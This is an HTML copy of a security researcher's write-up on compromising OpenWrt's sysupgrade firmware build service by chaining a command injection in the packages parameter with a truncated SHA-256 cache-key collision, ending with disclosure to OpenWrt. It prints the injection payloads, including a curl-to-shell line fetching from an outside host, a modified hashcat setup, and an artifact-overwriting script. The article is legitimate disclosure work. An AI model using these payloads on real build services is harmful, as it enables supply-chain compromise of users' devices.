<!DOCTYPE html>
<html>
  <head>
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>James Routley | Feed</title>
    <link
      rel="stylesheet"
      type="text/css"
      href="../styles.css"
      media="screen"
    />
  </head>
  <body>
    <a href="/index.html">Back</a>
    <a href="https://flatt.tech/research/posts/compromising-openwrt-supply-chain-sha256-collision/">Original</a>
    <h1>Compromising OpenWrt Supply Chain</h1>
    
    <div id="readability-page-1" class="page"><article>

    
    
    <h5>
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <rect x="4" y="5" width="16" height="16" rx="2"></rect>
        <line x1="16" y1="3" x2="16" y2="7"></line>
        <line x1="8" y1="3" x2="8" y2="7"></line>
        <line x1="4" y1="11" x2="20" y2="11"></line>
        <rect x="8" y="15" width="2" height="2"></rect>
      </svg>
      Posted on 
  
    December 6, 2024
  


      
         • 
      
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <circle cx="12" cy="12" r="9"></circle>
        <polyline points="12 7 12 12 15 15"></polyline>
      </svg>
      11 minutes
       •
      <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <path d="M3 19a9 9 0 0 1 9 0a9 9 0 0 1 9 0"></path>
        <path d="M3 6a9 9 0 0 1 9 0a9 9 0 0 1 9 0"></path>
        <line x1="3" y1="6" x2="3" y2="19"></line>
        <line x1="12" y1="6" x2="12" y2="19"></line>
        <line x1="21" y1="6" x2="21" y2="19"></line>
      </svg>
      2240 words
      
    </h5>
    

    <details id="TableOfContents">
    <summary>
      <span>Table of contents</span>
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
        <path stroke="none" d="M0 0h24v24H0z" fill="none"></path>
        <polyline points="6 9 12 15 18 9"></polyline>
     </svg>
    </summary>

    <ul>
        

        
        <li>
        <a href="#introduction">Introduction</a>
        

        
        </li><li>
        <a href="#sysupgradeopenwrtorg">sysupgrade.openwrt.org</a>
        

        
        </li><li>
        <a href="#command-injection">Command injection</a>
        

        
        </li><li>
        <a href="#sha-256-collision">SHA-256 collision</a>
        

        
        </li><li>
        <a href="#brute-forcing-the-sha-256">Brute-forcing the SHA-256</a>
        

        
        </li><li>
        <a href="#combining-both-attacks">Combining both attacks</a>
        

        
        </li><li>
        <a href="#reporting-the-issue">Reporting the issue</a>
        

        
        </li><li>
        <a href="#conclusion">Conclusion</a>
        

        
        </li><li>
        <a href="#shameless-plug">Shameless plug</a>
        </li></ul>
  </details>

    <h2 id="introduction">Introduction</h2>
<p>Hello, I’m RyotaK (<a href="https://twitter.com/ryotkak" target="_blank" rel="noopener">@ryotkak</a>
), a security engineer at Flatt Security Inc.</p>
<p>A few days ago, I was upgrading my home lab network, and I decided to upgrade the <a href="https://openwrt.org/" target="_blank" rel="noopener">OpenWrt</a>
 on my router.<sup id="fnref:1"><a href="#fn:1" role="doc-noteref">1</a></sup> After accessing the LuCI, which is the web interface of OpenWrt, I noticed that there is a section called <code>Attended Sysupgrade</code>, so I tried to upgrade the firmware using it.</p>
<p>After reading the description, I found that it states it builds new firmware using an online service.</p>
<center>
    <img alt="The attended sysupgrade service allows to easily upgrade vanilla and custom firmware images. This is done by building a new firmware on demand via an online service." src="https://flatt.tech/research/compromising-openwrt-supply-chain-sha256-collision/01.png"/>
</center>
<p>At this point, I was curious about how it works, so I decided to investigate about it.</p>
<h2 id="sysupgradeopenwrtorg">sysupgrade.openwrt.org</h2>
<p>After some research, I found that the online service mentioned above is hosted at <code>sysupgrade.openwrt.org</code>. This service allows users to build a new firmware image by selecting the target device and the desired packages.</p>
<ul>
<li>Target architecture</li>
<li>Device profile</li>
<li>Selected packages</li>
</ul>
<p>The server then builds the firmware image based on the information and sends it back to the OpenWrt, which then flashes the firmware image to the device.</p>
<p>As you can imagine, building an image with user-provided packages can be dangerous. If the server is building the user-provided source code and is not properly isolated, it can be easily compromised.</p>
<p>So, I started to investigate if there were any security issues in the service.</p>
<h2 id="command-injection">Command injection</h2>
<p>Fortunately, the server hosted at <code>sysupgrade.openwrt.org</code> is an open-source project, and the source code is hosted at <a href="https://github.com/openwrt/asu" target="_blank" rel="noopener">openwrt/asu</a>
.</p>
<p>After reading it a bit, I found that the server is using the containers to isolate the build environment like the following:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L154-L164" target="_blank" rel="noopener">asu/build.py line 154-164</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    container <span>=</span> podman<span>.</span>containers<span>.</span>create(
</span></span><span><span>        image,
</span></span><span><span>        command<span>=</span>[<span>&#34;sleep&#34;</span>, <span>&#34;600&#34;</span>],
</span></span><span><span>        mounts<span>=</span>mounts,
</span></span><span><span>        cap_drop<span>=</span>[<span>&#34;all&#34;</span>],
</span></span><span><span>        no_new_privileges<span>=</span><span>True</span>,
</span></span><span><span>        privileged<span>=</span><span>False</span>,
</span></span><span><span>        networks<span>=</span>{<span>&#34;pasta&#34;</span>: {}},
</span></span><span><span>        auto_remove<span>=</span><span>True</span>,
</span></span><span><span>        environment<span>=</span>environment,
</span></span><span><span>    )
</span></span></code></pre></div><p>I thought that it would be fun to escape the container, so I started to investigate further to find a way to do so.</p>
<p>Shortly after, I spotted the following line in the source code:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/build.py#L217-L226" target="_blank" rel="noopener">asu/build.py line 217-226</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    returncode, job<span>.</span>meta[<span>&#34;stdout&#34;</span>], job<span>.</span>meta[<span>&#34;stderr&#34;</span>] <span>=</span> run_cmd(
</span></span><span><span>        container,
</span></span><span><span>        [
</span></span><span><span>            <span>&#34;make&#34;</span>,
</span></span><span><span>            <span>&#34;manifest&#34;</span>,
</span></span><span><span>            <span>f</span><span>&#34;PROFILE=</span><span>{</span>build_request<span>.</span>profile<span>}</span><span>&#34;</span>,
</span></span><span><span>            <span>f</span><span>&#34;PACKAGES=</span><span>{</span><span>&#39; &#39;</span><span>.</span>join(build_cmd_packages)<span>}</span><span>&#34;</span>,
</span></span><span><span>            <span>&#34;STRIP_ABI=1&#34;</span>,
</span></span><span><span>        ],
</span></span><span><span>    )
</span></span></code></pre></div><p>The Makefile referenced above is from the imagebuilder of OpenWrt, and the <code>manifest</code> target is defined as follows:</p>
<p><a href="https://github.com/openwrt/openwrt/blob/3ba6737f2f4750e4f7c2b921ff023a99b9a27318/target/imagebuilder/files/Makefile#L325-L335" target="_blank" rel="noopener">target/imagebuilder/files/Makefile line 325-335</a>
</p>
<div><pre tabindex="0"><code data-lang="Makefile"><span><span><span>manifest</span><span>:</span> FORCE
</span></span><span><span>	<span>$(</span>MAKE<span>)</span> -s _check_profile
</span></span><span><span>	<span>$(</span>MAKE<span>)</span> -s _check_keys
</span></span><span><span>	<span>(</span><span>unset</span> PROFILE FILES PACKAGES MAKEFLAGS; <span>\
</span></span></span><span><span><span></span>	<span>$(</span>MAKE<span>)</span> -s _call_manifest <span>\
</span></span></span><span><span><span></span>		<span>$(if</span> <span>$(</span>PROFILE<span>)</span>,USER_PROFILE<span>=</span><span>&#34;</span><span>$(</span>PROFILE_FILTER<span>)</span><span>&#34;</span><span>)</span> <span>\
</span></span></span><span><span><span></span>		<span>$(if</span> <span>$(</span>PACKAGES<span>)</span>,USER_PACKAGES<span>=</span><span>&#34;</span><span>$(</span>PACKAGES<span>)</span><span>&#34;</span><span>)</span><span>)</span>
</span></span></code></pre></div><p>As the <code>make</code> command expands the variable before executing the command, variables that contain the user-controlled value can’t be used securely with it.</p>
<p>For example, the following Makefile with <code>make var=&#34;&#39;; whoami #&#34;</code> will execute the <code>whoami</code> command despite the variable <code>var</code> is quoted in the single quotes.</p>
<p>Since the <code>PACKAGES</code> variable contains the <code>packages</code> parameter from the request sent by the user, an attacker can execute an arbitrary command in the imagebuilder container by sending a package like <code>`command to execute`</code>.</p>
<p><a href="https://github.com/openwrt/asu/blob/07a2199dd5256075a5fab539421d55cb4673490c/asu/build_request.py#L59-L70" target="_blank" rel="noopener">asu/build_request.py line 59-70</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span>    packages: Annotated[
</span></span><span><span>        <span>list</span>[<span>str</span>],
</span></span><span><span>        Field(
</span></span><span><span>            examples<span>=</span>[[<span>&#34;vim&#34;</span>, <span>&#34;tmux&#34;</span>]],
</span></span><span><span>            description<span>=</span><span>&#34;&#34;&#34;
</span></span></span><span><span><span>                List of packages, either *additional* or *absolute* depending
</span></span></span><span><span><span>                of the `diff_packages` parameter.  This is augmented by the
</span></span></span><span><span><span>                `packages_versions` field, which allow you to additionally
</span></span></span><span><span><span>                specify the versions of the packages to be installed.
</span></span></span><span><span><span>            &#34;&#34;&#34;</span><span>.</span>strip(),
</span></span><span><span>        ),
</span></span><span><span>    ] <span>=</span> []
</span></span></code></pre></div><p>While the container that the command is executed in is isolated from the host, it’s still a good starting point to escape the container.<sup id="fnref:2"><a href="#fn:2" role="doc-noteref">2</a></sup></p>
<h2 id="sha-256-collision">SHA-256 collision</h2>
<p>After finding the command injection above, I was looking for a piece to escape the container.</p>
<p>About an hour later, I came across the following code:</p>
<p><a href="https://github.com/openwrt/asu/blob/ce2324a438ae8bd51856e9b6fb39578f507d2d9e/asu/util.py#L119-L149" target="_blank" rel="noopener">asu/util.py line 119-149</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span><span>def</span> <span>get_request_hash</span>(build_request: BuildRequest) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>&#34;&#34;&#34;Return sha256sum of an image request
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Creates a reproducible hash of the request by sorting the arguments
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        req (dict): dict containing request information
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of `req`
</span></span></span><span><span><span>    &#34;&#34;&#34;</span>
</span></span><span><span>    <span>return</span> get_str_hash(
</span></span><span><span>        <span>&#34;&#34;</span><span>.</span>join(
</span></span><span><span>            [
</span></span><span><span>                build_request<span>.</span>distro,
</span></span><span><span>                build_request<span>.</span>version,
</span></span><span><span>                build_request<span>.</span>version_code,
</span></span><span><span>                build_request<span>.</span>target,
</span></span><span><span>                build_request<span>.</span>profile<span>.</span>replace(<span>&#34;,&#34;</span>, <span>&#34;_&#34;</span>),
</span></span><span><span>                get_packages_hash(build_request<span>.</span>packages),
</span></span><span><span>                get_manifest_hash(build_request<span>.</span>packages_versions),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>diff_packages),
</span></span><span><span>                <span>&#34;&#34;</span>,  <span># build_request.filesystem</span>
</span></span><span><span>                get_str_hash(build_request<span>.</span>defaults),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>rootfs_size_mb),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>repository_keys),
</span></span><span><span>                <span>str</span>(build_request<span>.</span>repositories),
</span></span><span><span>            ]
</span></span><span><span>        ),
</span></span><span><span>        REQUEST_HASH_LENGTH,
</span></span><span><span>    )
</span></span></code></pre></div><p>This method is used to generate a hash of the request, and the hash is used as the cache key of the builds. When I saw this, I wondered why it has several inner hashes instead of using the raw string.</p>
<p>I checked the code that calculates the hash for packages:</p>
<p><a href="https://github.com/openwrt/asu/blob/07ef08e9db8ccd13e439b8338150f32b1594447b/asu/util.py#L69-L164" target="_blank" rel="noopener">asu/util.py line 152-164</a>
</p>
<div><pre tabindex="0"><code data-lang="py"><span><span><span>def</span> <span>get_str_hash</span>(string: <span>str</span>, length: <span>int</span> <span>=</span> REQUEST_HASH_LENGTH) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>&#34;&#34;&#34;Return sha256sum of str with optional length
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        string (str): input string
</span></span></span><span><span><span>        length (int): hash length
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of string with specified length
</span></span></span><span><span><span>    &#34;&#34;&#34;</span>
</span></span><span><span>    h <span>=</span> hashlib<span>.</span>sha256(<span>bytes</span>(string <span>or</span> <span>&#34;&#34;</span>, <span>&#34;utf-8&#34;</span>))
</span></span><span><span>    <span>return</span> h<span>.</span>hexdigest()[:length]
</span></span><span><span>
</span></span><span><span>[<span>...</span>]
</span></span><span><span>
</span></span><span><span><span>def</span> <span>get_packages_hash</span>(packages: <span>list</span>[<span>str</span>]) <span>-&gt;</span> <span>str</span>:
</span></span><span><span>    <span>&#34;&#34;&#34;Return sha256sum of package list
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Duplicate packages are automatically removed and the list is sorted to be
</span></span></span><span><span><span>    reproducible
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Args:
</span></span></span><span><span><span>        packages (list): list of packages
</span></span></span><span><span><span>
</span></span></span><span><span><span>    Returns:
</span></span></span><span><span><span>        str: hash of `req`
</span></span></span><span><span><span>    &#34;&#34;&#34;</span>
</span></span><span><span>    <span>return</span> get_str_hash(<span>&#34; &#34;</span><span>.</span>join(<span>sorted</span>(<span>list</span>(<span>set</span>(packages)))), <span>12</span>)
</span></span></code></pre></div><p>I immediately noticed that the length of the hash is truncated to 12, out of 64 characters.</p>
<p>While this hash isn’t used as the cache key, the outer hash that includes this hash is used. So, by creating a collision of the packages’ hash, we can produce the same cache key even if the packages are different. This allows an attacker to force the server to return the wrong build artifact for requests that have different packages.</p>
<p>As I was unsure if the collision was actually possible, I decided to test it by brute-forcing the SHA-256 to find a 12-character collision.</p>
<h2 id="brute-forcing-the-sha-256">Brute-forcing the SHA-256</h2>
<p>Since I couldn’t find the hash brute-forcing tools with partial match support, I started to implement it by myself.</p>
<p>After some trial and error, I successfully made an OpenCL program to perform the brute-forcing on the GPU. However, upon testing it, the performance was terrible, it takes 10 seconds to calculate 100 million hashes.</p>
<p>So, I ended up using the known hash brute-forcing tool program called <a href="https://hashcat.net/hashcat/" target="_blank" rel="noopener">Hashcat</a>
.</p>
<div><pre tabindex="0"><code data-lang="diff"><span><span><span>diff --git a/OpenCL/m01400_a3-optimized.cl b/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span>index 6b82987bb..12f2bc17a 100644
</span></span></span><span><span><span></span><span>--- a/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span></span><span>+++ b/OpenCL/m01400_a3-optimized.cl
</span></span></span><span><span><span></span><span>@@ -165,7 +165,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>   /**
</span></span><span><span>    * reverse
</span></span><span><span>    */
</span></span><span><span><span>-
</span></span></span><span><span><span></span><span>+/*
</span></span></span><span><span><span></span>   u32 a_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[0];
</span></span><span><span>   u32 b_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[1];
</span></span><span><span>   u32 c_rev = digests_buf[DIGESTS_OFFSET_HOST].digest_buf[2];
</span></span><span><span><span>@@ -179,7 +179,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span>   SHA256_STEP_REV (a_rev, b_rev, c_rev, d_rev, e_rev, f_rev, g_rev, h_rev);
</span></span><span><span><span>-
</span></span></span><span><span><span></span><span>+*/
</span></span></span><span><span><span></span>   /**
</span></span><span><span>    * loop
</span></span><span><span>    */
</span></span><span><span><span>@@ -279,7 +279,7 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>     w7_t = SHA256_EXPAND (w5_t, w0_t, w8_t, w7_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, w7_t, SHA256C37);
</span></span><span><span>     w8_t = SHA256_EXPAND (w6_t, w1_t, w9_t, w8_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, a, b, c, d, e, f, g, h, w8_t, SHA256C38);
</span></span><span><span> 
</span></span><span><span><span>-    if (MATCHES_NONE_VS (h, d_rev)) continue;
</span></span></span><span><span><span></span><span>+    //if (MATCHES_NONE_VS (h, d_rev)) continue;
</span></span></span><span><span><span></span> 
</span></span><span><span>     w9_t = SHA256_EXPAND (w7_t, w2_t, wa_t, w9_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, h, a, b, c, d, e, f, g, w9_t, SHA256C39);
</span></span><span><span>     wa_t = SHA256_EXPAND (w8_t, w3_t, wb_t, wa_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, g, h, a, b, c, d, e, f, wa_t, SHA256C3a);
</span></span><span><span><span>@@ -289,7 +289,8 @@ DECLSPEC void m01400s (PRIVATE_AS u32 *w, const u32 pw_len, KERN_ATTR_FUNC_VECTO
</span></span></span><span><span><span></span>     we_t = SHA256_EXPAND (wc_t, w7_t, wf_t, we_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, c, d, e, f, g, h, a, b, we_t, SHA256C3e);
</span></span><span><span>     wf_t = SHA256_EXPAND (wd_t, w8_t, w0_t, wf_t); SHA256_STEP (SHA256_F0o, SHA256_F1o, b, c, d, e, f, g, h, a, wf_t, SHA256C3f);
</span></span><span><span> 
</span></span><span><span><span>-    COMPARE_S_SIMD (d, h, c, g);
</span></span></span><span><span><span></span><span>+    //COMPARE_S_SIMD (d, h, c, g);
</span></span></span><span><span><span>+    COMPARE_S_SIMD (a, a, a, a);
</span></span></span><span><span><span></span>   }
</span></span><span><span> }
</span></span><span><span> 
</span></span><span><span><span>diff --git a/src/modules/module_01400.c b/src/modules/module_01400.c
</span></span></span><span><span><span>index ab002efbe..03549d7f5 100644
</span></span></span><span><span><span></span><span>--- a/src/modules/module_01400.c
</span></span></span><span><span><span></span><span>+++ b/src/modules/module_01400.c
</span></span></span><span><span><span></span><span>@@ -11,10 +11,10 @@
</span></span></span><span><span><span></span> #include &#34;shared.h&#34;
</span></span><span><span> 
</span></span><span><span> static const u32   ATTACK_EXEC    = ATTACK_EXEC_INSIDE_KERNEL;
</span></span><span><span><span>-static const u32   DGST_POS0      = 3;
</span></span></span><span><span><span>-static const u32   DGST_POS1      = 7;
</span></span></span><span><span><span>-static const u32   DGST_POS2      = 2;
</span></span></span><span><span><span>-static const u32   DGST_POS3      = 6;
</span></span></span><span><span><span></span><span>+static const u32   DGST_POS0      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS1      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS2      = 0;
</span></span></span><span><span><span>+static const u32   DGST_POS3      = 0;
</span></span></span><span><span><span></span> static const u32   DGST_SIZE      = DGST_SIZE_4_8;
</span></span><span><span> static const u32   HASH_CATEGORY  = HASH_CATEGORY_RAW_HASH;
</span></span><span><span> static const char *HASH_NAME      = &#34;SHA2-256&#34;;
</span></span></code></pre></div><p>Then, I wrapped it with a small script to check if the output from Hashcat contains the 12-character collision.</p>
<h2 id="combining-both-attacks">Combining both attacks</h2>
<p>To combine both attacks, we need to find a payload that has the 12-character hash collision against the legitimate package list.</p>
<p>I’ve gathered the package list from the <code>firmware-selector.openwrt.org</code>, which is a frontend of the <code>sysupgrade.openwrt.org</code>, and calculated the legitimate hash:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ <span>printf</span> <span>&#39;base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd&#39;</span> | sha256sum
</span></span><span><span>8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb  -
</span></span></code></pre></div><p>The first 12 characters of this hash are <code>8f7018b33d94</code>, so we need to find a command injection payload that has the same prefix for the hash.</p>
<p>To find such a payload, I executed the modified version of the Hashcat on RTX 4090 with the following command:</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>$ ./hashcat -m <span>1400</span> 8f7018b33d9472113274fa6516c237e32f67685fc1fc3cbdbf144647d0b3feeb -O -a <span>3</span> -w <span>3</span> <span>&#39;`curl -L tmp.ryotak.net/?l?l?l?l?l?l?l?l?l?l|sh`&#39;</span> --self-test-disable --potfile-disable --keep-guessing
</span></span></code></pre></div><p>After executing the command, Hashcat started to calculate hashes at the speed of around 500 million hashes per second, so I left it running.</p>
<p>When I checked the output after a while, the Hashcat calculated all possible patterns, but it didn’t find 12-character collisions. This was because I calculated the space of <code>?l?l?l?l?l?l?l?l?l?l</code> wrongly.</p>
<p><code>?l</code> is a mask pattern that generates <code>a-z</code>, so the space of <code>?l?l?l?l?l?l?l?l?l?l</code> (10 characters) is <code>26^10 = 141,167,095,653,376</code>, which is about half of <code>2^48 = 281,474,976,710,656</code>.</p>
<p>So, I fixed the mask pattern to <code>?l?l?l?l?l?l?l?l?l?l?l</code> (11 characters) and left it running again. After executing the command, I wondered if I could make the brute-forcing faster, so I started to poke the Hashcat.</p>
<p>Soon, I noticed that the performance drastically increased when I moved the mask pattern to the start of the command like <code>`?l?l?l?l?l?l?l?l?l?l?l `curl -L tmp.ryotak.net/|sh`</code></p>
<pre tabindex="0"><code>`?l?l?l?l?l?l?l?l?l?l?l||curl -L tmp.ryotak.net/8f7018b33d94|sh`
</code></pre><p>By using this pattern, the Hashcat was able to calculate the hashes at the speed of 18 billion hashes per second. Within an hour, the Hashcat found the 12 characters collision:</p>
<pre tabindex="0"><code>$ printf &#39;`slosuocutre||curl -L tmp.ryotak.net/8f7018b33d94|sh`&#39; | sha256sum
8f7018b33d9464976ab199f100812d2d24d5e84a76555c659e88e0b6989a4bd8  -
</code></pre><p>Sending this payload as the <code>packages</code> parameter, the command injection is triggered and the script from <code>tmp.ryotak.net</code> is executed.</p>
<div><pre tabindex="0"><code data-lang="sh"><span><span>cat &gt;&gt; /builder/scripts/json_overview_image_info.py <span>&lt;&lt;PY
</span></span></span><span><span><span>import os
</span></span></span><span><span><span>files = os.listdir(os.environ[&#34;BIN_DIR&#34;])
</span></span></span><span><span><span>for filename in files:
</span></span></span><span><span><span>    if filename.endswith(&#34;.bin&#34;):
</span></span></span><span><span><span>        filepath = os.path.join(os.environ[&#34;BIN_DIR&#34;], filename)
</span></span></span><span><span><span>        with open(filepath, &#34;w&#34;) as f:
</span></span></span><span><span><span>            f.write(&#34;test&#34;)
</span></span></span><span><span><span>PY</span>
</span></span></code></pre></div><p>Then, as the hash collision occurred, the server returns the overwritten build artifact to the legitimate request that requests the following packages:</p>
<pre tabindex="0"><code>base-files busybox ca-bundle dnsmasq dropbear firewall4 fstools kmod-gpio-button-hotplug kmod-hwmon-nct7802 kmod-nft-offload libc libgcc libustream-mbedtls logd luci mtd netifd nftables odhcp6c odhcpd-ipv6only opkg ppp ppp-mod-pppoe procd procd-seccomp procd-ujail uboot-envtools uci uclient-fetch urandom-seed urngd
</code></pre><p>By abusing this, an attacker could force the user to upgrade to the malicious firmware, which could lead to the compromise of the device.</p>
<h2 id="reporting-the-issue">Reporting the issue</h2>
<p>After confirming the attack, I reported the issue to the OpenWrt team via <a href="https://github.com/openwrt/asu/security/advisories/new" target="_blank" rel="noopener">the private vulnerability reporting on GitHub</a>
.</p>
<p>Soon after acknowledging the issue, they stopped the <code>sysupgrade.openwrt.org</code> service temporarily and investigated the issue. Within 3 hours, they released the fixed version and restarted the service.</p>
<p>While both issues are fixed by the OpenWrt team, it was unknown if this attack was exploited by someone else because this vulnerability existed for a while.</p>
<h2 id="conclusion">Conclusion</h2>
<p>In this article, I explained how I could compromise the <code>sysupgrade.openwrt.org</code> service by exploiting the command injection and the SHA-256 collision.</p>
<p>I appreciate the effort of the OpenWrt team to fix the issues in an incredibly short time and notify the users promptly.</p>
<h2 id="shameless-plug">Shameless plug</h2>
<p>At Flatt Security, we specialize in providing top-notch security assessment and penetration testing services. To celebrate the update of our brand new English web pages, you can currently receive a month-long investigation by our elite engineers for just $40,000!</p>
<p>We also offer a powerful security assessment tool called Shisho Cloud, which combines Cloud Security Posture Management (CSPM) and Cloud Infrastructure Entitlement Management (CIEM) capabilities with Dynamic Application Security Testing (DAST) for web applications.</p>
<p>If you’re interested in learning more, feel free to reach out to us at <a href="https://flatt.tech/en" target="_blank" rel="noopener">https://flatt.tech/en</a>
.</p>


  </article></div>
  </body>
</html>
